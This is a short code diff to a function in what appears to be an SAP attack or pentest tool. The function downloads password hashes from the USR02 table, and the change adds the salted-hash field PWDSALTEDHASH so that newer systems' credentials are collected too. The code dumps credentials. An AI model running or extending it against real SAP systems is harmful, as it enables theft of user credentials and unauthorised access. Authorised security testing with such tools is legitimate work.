@@ -1498,10 +1498,15 @@ def download_password_hashes(node: SAPNode,
                              creds: Credentials = None) -> list:
     """Download password hashes from USR02 table.
 
-    Returns list of dicts: {BNAME, BCODE, PASSCODE, CODVN, USTYP, MANDT}
+    Returns list of dicts with fields: MANDT, BNAME, BCODE, PASSCODE,
+    PWDSALTEDHASH, CODVN, USTYP, UFLAG.
+
+    PWDSALTEDHASH is the iSSHA-1 salted hash used in newer SAP systems
+    (code version H and above).  On older systems the field may be empty.
     """
     print(f"[*] Downloading password hashes from {node.sid}...")
-    fields = ["MANDT", "BNAME", "BCODE", "PASSCODE", "CODVN", "USTYP", "UFLAG"]
+    fields = ["MANDT", "BNAME", "BCODE", "PASSCODE", "PWDSALTEDHASH",
+              "CODVN", "USTYP", "UFLAG"]
     rows = read_table(node, "USR02", fields=fields, creds=creds, max_rows=9999)
     if rows:
         print(f"[+] Downloaded {len(rows)} password hashes from {node.sid}")
